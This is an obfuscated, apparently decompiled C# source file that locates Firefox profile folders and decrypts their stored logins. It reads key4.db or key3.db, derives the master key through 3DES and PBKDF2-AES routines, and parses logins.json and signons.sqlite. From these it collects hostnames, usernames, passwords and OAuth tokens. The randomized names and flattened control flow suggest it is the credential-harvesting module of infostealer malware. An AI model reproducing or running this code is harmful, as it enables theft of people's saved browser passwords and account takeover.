using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using _81d;
using SNt;
using p3N5Y;
using q9Ep;

namespace c1SUVJC;

public class MRw
{
	private static byte[] _9d2yTviae8E(byte[] qKADD7, byte[] _8tbgoZhtX, byte[] _3gE, byte[] mSDaXgI)
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		try
		{
			byte[] jOSkmlSr3p = KKA.kVYABv(b4v.NVDfZEIm9(qKADD7, _8tbgoZhtX));
			byte[] q6Npcj = KKA.kVYABv(b4v.NVDfZEIm9(jOSkmlSr3p, _3gE));
			byte[] array = new byte[20];
			Array.Copy(_3gE, 0, array, 0, _3gE.Length);
			for (int i = _3gE.Length; i <= 19; i++)
			{
				array[i] = 0;
			}
			byte[] jOSkmlSr3p2 = KKA.SF1(q6Npcj, b4v.NVDfZEIm9(array, _3gE));
			byte[] jOSkmlSr3p3 = KKA.SF1(q6Npcj, array);
			byte[] n7MRzN = KKA.SF1(q6Npcj, b4v.NVDfZEIm9(jOSkmlSr3p3, _3gE));
			byte[] sourceArray = b4v.NVDfZEIm9(jOSkmlSr3p2, n7MRzN);
			byte[] array2 = new byte[8];
			byte[] array3 = new byte[24];
			Array.Copy(sourceArray, 0, array3, 0, 24);
			Array.Copy(sourceArray, 32, array2, 0, 8);
			return _3VzYbXLJt4.wBp(mSDaXgI, array3, array2);
		}
		catch
		{
			return null;
		}
	}

	private static byte[] BZYBVcMMS(byte[] Y3XKi6O, byte[] wCLVlb, byte[] _7E2, byte[] mqajSsCImEE, byte[] KwaHLGb)
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		try
		{
			byte[] password = KKA.kVYABv(b4v.NVDfZEIm9(Y3XKi6O, wCLVlb));
			byte[] sjy = new byte[32];
			using (HMACSHA256 algorithm = new HMACSHA256())
			{
				sjy = new _0Jvr0(algorithm, password, _7E2, 1).t6HPwQD(32);
			}
			byte[] array = new byte[16]
			{
				4, 14, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0
			};
			Array.Copy(KwaHLGb, 0, array, 2, 14);
			LPi8kXmS67z lPi8kXmS67z = new LPi8kXmS67z();
			return lPi8kXmS67z.eEF7nNODdAE(mqajSsCImEE, sjy, array);
		}
		catch
		{
			return null;
		}
	}

	public static byte[] GM8tFfpx6(string XYU)
	{
		int num = 0;
		byte[] array = default;
		while (true)
		{
			if (num == 3)
			{
				try
				{
					_5bBC obj = new _5bBC(XYU + "key4.db");
					if (!obj.ga9("metaData"))
					{
						return null;
					}
					if (obj.Jw0(0, "id") == "password")
					{
						byte[] bytes = Encoding.Default.GetBytes(obj.Jw0(0, "item1"));
						byte[] bytes2 = Encoding.Default.GetBytes(obj.Jw0(0, "item2"));
						npb7IanTN npb7IanTN2 = new npb7IanTN();
						i0E9 i0E10 = npb7IanTN2.ncGMtyBS(bytes2);
						string text = b4v.glbopsCe(i0E10.eWOcOb[0].eWOcOb[0].eWOcOb[0].WCJJ6).ToLower();
						_5bBC obj2 = new _5bBC(XYU + "key4.db");
						if (!obj2.ga9("nssPrivate"))
						{
							return null;
						}
						byte[] bytes3 = Encoding.Default.GetBytes(obj2.Jw0(0, "a11"));
						Encoding.Default.GetBytes(obj2.Jw0(0, "a102"));
						i0E9 i0E11 = npb7IanTN2.ncGMtyBS(bytes3);
						if (text.Contains("2a864886f70d0209") | text.Contains("2a864886f70d010c050103"))
						{
							byte[] data = i0E11.eWOcOb[0].eWOcOb[0].eWOcOb[1].eWOcOb[0].WCJJ6;
							byte[] data2 = i0E11.eWOcOb[0].eWOcOb[1].WCJJ6;
							byte[] sourceArray = _9d2yTviae8E(bytes, Encoding.ASCII.GetBytes(""), data, data2);
							Array.Copy(sourceArray, array, 24);
							return array;
						}
						byte[] data3 = i0E11.eWOcOb[0].eWOcOb[0].eWOcOb[1].eWOcOb[0].eWOcOb[1].eWOcOb[0].WCJJ6;
						byte[] data4 = i0E11.eWOcOb[0].eWOcOb[1].WCJJ6;
						byte[] data5 = i0E11.eWOcOb[0].eWOcOb[0].eWOcOb[1].eWOcOb[2].eWOcOb[1].WCJJ6;
						byte[] array2 = BZYBVcMMS(bytes, Encoding.ASCII.GetBytes(""), data3, data4, data5);
						if (array2 == null)
						{
							return null;
						}
						Array.Copy(array2, array, 24);
						return array;
					}
					return null;
				}
				catch
				{
					return null;
				}
			}
			if (num != 4)
			{
				if (num == 1)
				{
					array = new byte[24];
					num = 2;
				}
				if (num == 2)
				{
					if (!File.Exists(XYU + "key4.db"))
					{
						if (File.Exists(XYU + "key3.db"))
						{
							try
							{
								string text2 = "";
								byte[] qKADD = new byte[0];
								wO2K wO2K2 = new wO2K(XYU + "key3.db");
								foreach (KeyValuePair<string, string> key in wO2K2.RJhaQM)
								{
									if ((key.Key != "global-salt") & (key.Key != "Version") & (key.Key != "password-check"))
									{
										text2 = key.Value;
									}
									if (key.Key == "global-salt")
									{
										qKADD = b4v.H4VWdV77v(key.Value.Replace("-", ""));
									}
								}
								npb7IanTN npb7IanTN3 = new npb7IanTN();
								i0E9 i0E12 = npb7IanTN3.ncGMtyBS(b4v.H4VWdV77v(text2.Replace("-", "")));
								byte[] data6 = i0E12.eWOcOb[0].eWOcOb[0].eWOcOb[1].eWOcOb[0].WCJJ6;
								byte[] iKMidvH = _9d2yTviae8E(qKADD, Encoding.ASCII.GetBytes(""), data6, i0E12.eWOcOb[0].eWOcOb[1].WCJJ6);
								i0E9 i0E13 = npb7IanTN3.ncGMtyBS(iKMidvH);
								i0E9 i0E14 = npb7IanTN3.ncGMtyBS(i0E13.eWOcOb[0].eWOcOb[2].WCJJ6);
								if (i0E14.eWOcOb[0].eWOcOb[3].WCJJ6.Length > 24)
								{
									Array.Copy(i0E14.eWOcOb[0].eWOcOb[3].WCJJ6, i0E14.eWOcOb[0].eWOcOb[3].WCJJ6.Length - 24, array, 0, 24);
								}
								else
								{
									Array.Copy(i0E14.eWOcOb[0].eWOcOb[0].WCJJ6, array, 24);
								}
								return array;
							}
							catch
							{
							}
							goto IL_06eb;
						}
						return null;
					}
					num = 3;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 5)
				{
					break;
				}
				continue;
			}
			goto IL_06eb;
			IL_06eb:
			return null;
		}
		byte[] result = default;
		return result;
	}

	public static string[] pw7TE(string gylTsfA)
	{
		int num = 0;
		List<string> list = default;
		do
		{
			if (num == 1)
			{
				list = new List<string>();
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 2);
		try
		{
			foreach (Match item in new Regex("Path=([A-z0-9\\/\\.\\-]+)").Matches(File.ReadAllText(gylTsfA + "profiles.ini")))
			{
				list.Add(gylTsfA + item.Groups[1].Value + "\\");
			}
		}
		catch
		{
		}
		return list.ToArray();
	}

	public static List<ii68> KUy0mI0a(string[] rdxCOMkrp, string _4HoK)
	{
		int num = 0;
		string input = default;
		string text = default;
		int num2 = default;
		string[] array = default;
		string value = default;
		string value2 = default;
		MatchCollection matchCollection = default;
		int num3 = default;
		Regex regex = default;
		string value3 = default;
		string password = default;
		string text2 = default;
		byte[] array2 = default;
		byte[] array3 = default;
		List<ii68> list = default;
		string input2 = default;
		byte[] data = default;
		i0E9 i0E10 = default;
		npb7IanTN npb7IanTN2 = default;
		i0E9 i0E11 = default;
		byte[] data2 = default;
		byte[] data3 = default;
		do
		{
			if (num == 10)
			{
				input = File.ReadAllText(text + "logins.json");
				num = 11;
			}
			if (num == 38)
			{
				goto IL_0050;
			}
			goto IL_00b2;
			IL_04e8:
			if (num == 31)
			{
				goto IL_02d5;
			}
			if (num == 40)
			{
				goto IL_0518;
			}
			goto IL_0539;
			IL_04d0:
			if (num2 < array.Length)
			{
				goto IL_039a;
			}
			num = 43;
			goto IL_04e8;
			IL_00b2:
			if (num == 32)
			{
				goto IL_00c3;
			}
			goto IL_00f7;
			IL_00f7:
			if (num == 37)
			{
				goto IL_0108;
			}
			goto IL_0128;
			IL_0128:
			if (num == 34)
			{
				if (!value.StartsWith("oauth"))
				{
					goto IL_0108;
				}
				num = 35;
			}
			if (num == 17)
			{
				value2 = matchCollection[num3 + 1].Groups[2].Value;
				num = 18;
			}
			if (num == 12)
			{
				matchCollection = regex.Matches(input);
				num = 13;
			}
			if (num == 15)
			{
				goto IL_0518;
			}
			if (num == 18)
			{
				value3 = matchCollection[num3 + 2].Groups[2].Value;
				num = 19;
			}
			if (num == 35)
			{
				password = Convert.ToBase64String(Encoding.UTF8.GetBytes(text2));
				num = 36;
			}
			if (num == 41)
			{
				goto IL_026b;
			}
			goto IL_0282;
			IL_0518:
			if (num3 > matchCollection.Count - 1)
			{
				num = 41;
				goto IL_0539;
			}
			goto IL_0702;
			IL_02f3:
			if (num == 3)
			{
				num2 = 0;
				num = 4;
			}
			if (num == 28)
			{
				array2 = new byte[128];
				num = 29;
			}
			if (num == 9)
			{
				if (array3 == null)
				{
					goto IL_026b;
				}
				num = 10;
			}
			if (num == 19)
			{
				if (string.IsNullOrEmpty(value))
				{
					goto IL_03f1;
				}
				num = 20;
			}
			if (num == 5)
			{
				goto IL_039a;
			}
			goto IL_03b0;
			IL_0108:
			password = Regex.Replace(text2, "[^\\u0020-\\u007F]", "");
			num = 38;
			goto IL_0128;
			IL_0050:
			list.Add(new ii68
			{
				byIdLuuGZbL = value,
				S8v = Regex.Replace(input2, "[^\\u0020-\\u007F]", ""),
				_9H5rP7hg2 = password,
				oVAe = _4HoK
			});
			num = 39;
			goto IL_00b2;
			IL_0408:
			if (num == 24)
			{
				data = i0E10.eWOcOb[0].eWOcOb[2].WCJJ6;
				num = 25;
			}
			if (num == 13)
			{
				npb7IanTN2 = new npb7IanTN();
				num = 14;
			}
			if (num == 30)
			{
				Array.Copy(i0E11.eWOcOb[0].eWOcOb[2].WCJJ6, array2, 128);
				num = 31;
			}
			if (num == 42)
			{
				goto IL_04d0;
			}
			goto IL_04e8;
			IL_039a:
			text = array[num2];
			num = 6;
			goto IL_03b0;
			IL_0539:
			if (num == 22)
			{
				i0E10 = npb7IanTN2.ncGMtyBS(Convert.FromBase64String(value2));
				num = 23;
			}
			if (num == 20)
			{
				if (string.IsNullOrEmpty(value2))
				{
					goto IL_03f1;
				}
				num = 21;
			}
			if (num == 4)
			{
				goto IL_04d0;
			}
			if (num == 7)
			{
				if (GM8tFfpx6(text) == null)
				{
					goto IL_026b;
				}
				num = 8;
			}
			if (num == 11)
			{
				regex = new Regex("\\\"(hostname|encryptedPassword|encryptedUsername)\":\"(.*?)\"");
				num = 12;
			}
			if (num == 2)
			{
				array = rdxCOMkrp;
				num = 3;
			}
			if (num == 8)
			{
				array3 = GM8tFfpx6(text);
				num = 9;
			}
			if (num == 23)
			{
				data2 = i0E10.eWOcOb[0].eWOcOb[1].eWOcOb[1].WCJJ6;
				num = 24;
			}
			if (num == 27)
			{
				data3 = i0E11.eWOcOb[0].eWOcOb[1].eWOcOb[1].WCJJ6;
				num = 28;
			}
			if (num == 16)
			{
				goto IL_0702;
			}
			goto IL_0730;
			IL_0730:
			if (num == 25)
			{
				input2 = _3VzYbXLJt4.fOLl(data, array3, data2);
				num = 26;
			}
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 29)
			{
				if (i0E11.eWOcOb[0].eWOcOb[2].WCJJ6.Length <= 128)
				{
					goto IL_00c3;
				}
				num = 30;
			}
			if (num == 6)
			{
				if (!File.Exists(text + "logins.json"))
				{
					goto IL_026b;
				}
				num = 7;
			}
			if (num == 14)
			{
				num3 = 0;
				num = 15;
			}
			if (num == 0)
			{
				num = 1;
			}
			continue;
			IL_03f1:
			num3 += 3;
			num = 40;
			goto IL_0408;
			IL_026b:
			num2++;
			num = 42;
			goto IL_0282;
			IL_0702:
			value = matchCollection[num3].Groups[2].Value;
			num = 17;
			goto IL_0730;
			IL_00c3:
			array2 = i0E11.eWOcOb[0].eWOcOb[2].WCJJ6;
			num = 33;
			goto IL_00f7;
			IL_02d5:
			text2 = _3VzYbXLJt4.fOLl(array2, array3, data3);
			num = 34;
			goto IL_02f3;
			IL_0282:
			if (num == 21)
			{
				if (value3 == null)
				{
					goto IL_03f1;
				}
				num = 22;
			}
			if (num == 36)
			{
				goto IL_0050;
			}
			if (num == 33)
			{
				goto IL_02d5;
			}
			goto IL_02f3;
			IL_03b0:
			if (num == 26)
			{
				i0E11 = npb7IanTN2.ncGMtyBS(Convert.FromBase64String(value3));
				num = 27;
			}
			if (num == 39)
			{
				goto IL_03f1;
			}
			goto IL_0408;
		}
		while (num != 43);
		return list;
	}

	public static List<ii68> B9NSlpBkeG(string[] mMgvMZPE, string _0QZSl)
	{
		int num = 0;
		List<ii68> list = default;
		string text = default;
		string text2 = default;
		string[] array = default;
		byte[] array2 = default;
		int num2 = default;
		while (true)
		{
			if (num == 5)
			{
				goto IL_001f;
			}
			goto IL_0035;
			IL_0035:
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 6)
			{
				text = text2 + "signons.sqlite";
				num = 7;
			}
			if (num == 2)
			{
				array = mMgvMZPE;
				num = 3;
			}
			if (num == 8)
			{
				array2 = GM8tFfpx6(text2);
				num = 9;
			}
			if (num == 7)
			{
				if (!File.Exists(text))
				{
					goto IL_04a4;
				}
				num = 8;
			}
			if (num == 3)
			{
				num2 = 0;
				num = 4;
			}
			if (num == 9)
			{
				if (array2 == null)
				{
					goto IL_04a4;
				}
				num = 10;
			}
			if (num == 4)
			{
				goto IL_04b2;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num != 10)
			{
				continue;
			}
			_5bBC obj;
			try
			{
				obj = new _5bBC(text);
			}
			catch
			{
				goto IL_04a4;
			}
			if (obj.ga9("moz_logins"))
			{
				npb7IanTN npb7IanTN2 = new npb7IanTN();
				for (int i = 0; i <= obj.FtN5geM() - 1; i++)
				{
					try
					{
						string text3 = obj.Jw0(i, "hostname");
						string text4 = obj.Jw0(i, "encryptedUsername");
						string text5 = obj.Jw0(i, "encryptedPassword");
						if (!string.IsNullOrEmpty(text3) && !string.IsNullOrEmpty(text4) && text5 != null)
						{
							i0E9 i0E10 = npb7IanTN2.ncGMtyBS(Convert.FromBase64String(text4));
							byte[] data = i0E10.eWOcOb[0].eWOcOb[1].eWOcOb[1].WCJJ6;
							byte[] data2 = i0E10.eWOcOb[0].eWOcOb[2].WCJJ6;
							string input = _3VzYbXLJt4.fOLl(data2, array2, data);
							i0E9 i0E11 = npb7IanTN2.ncGMtyBS(Convert.FromBase64String(text5));
							byte[] data3 = i0E11.eWOcOb[0].eWOcOb[1].eWOcOb[1].WCJJ6;
							byte[] array3 = new byte[128];
							if (i0E11.eWOcOb[0].eWOcOb[2].WCJJ6.Length > 128)
							{
								Array.Copy(i0E11.eWOcOb[0].eWOcOb[2].WCJJ6, array3, 128);
							}
							else
							{
								array3 = i0E11.eWOcOb[0].eWOcOb[2].WCJJ6;
							}
							string text6 = _3VzYbXLJt4.fOLl(array3, array2, data3);
							string password = ((!text3.StartsWith("oauth")) ? Regex.Replace(text6, "[^\\u0020-\\u007F]", "") : Convert.ToBase64String(Encoding.UTF8.GetBytes(text6)));
							list.Add(new ii68
							{
								byIdLuuGZbL = text3,
								S8v = Regex.Replace(input, "[^\\u0020-\\u007F]", ""),
								_9H5rP7hg2 = password,
								oVAe = _0QZSl
							});
						}
					}
					catch
					{
					}
				}
			}
			goto IL_04a4;
			IL_04a4:
			num2++;
			goto IL_04b2;
			IL_04b2:
			if (num2 >= array.Length)
			{
				break;
			}
			goto IL_001f;
			IL_001f:
			text2 = array[num2];
			num = 6;
			goto IL_0035;
		}
		return list;
	}
}
